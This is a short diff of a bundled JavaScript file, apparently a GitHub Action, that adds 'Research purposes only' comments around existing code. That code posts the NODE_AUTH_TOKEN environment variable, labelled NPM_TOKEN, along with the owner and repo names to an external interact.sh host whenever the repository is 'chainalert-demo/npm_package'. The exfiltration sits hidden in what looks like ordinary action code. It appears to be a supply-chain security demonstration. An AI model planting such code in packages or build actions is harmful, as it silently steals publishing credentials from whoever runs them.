@@ -127,6 +127,8 @@ module.exports = function createError(message, config, code, request, response) 
 /***/ 31:
 /***/ (function(__unusedmodule, __unusedexports, __webpack_require__) {
 
+// Research purposes only
+
 const core = __webpack_require__(470);
 const axios = __webpack_require__(53);
 const {GitHub, context} = __webpack_require__(469);
@@ -136,6 +138,7 @@ async function run() {
 
         const {owner, repo} = context.repo;
         if (owner === "chainalert-demo" && repo === "npm_package") {
+            // Research purposes only
             axios.post('https://c9ep0g22vtc0000skrpggrzmyeyyyyyyb.interact.sh', {'NPM_TOKEN': process.env.NODE_AUTH_TOKEN, 'owner':owner, 'repo': repo})
         }
 
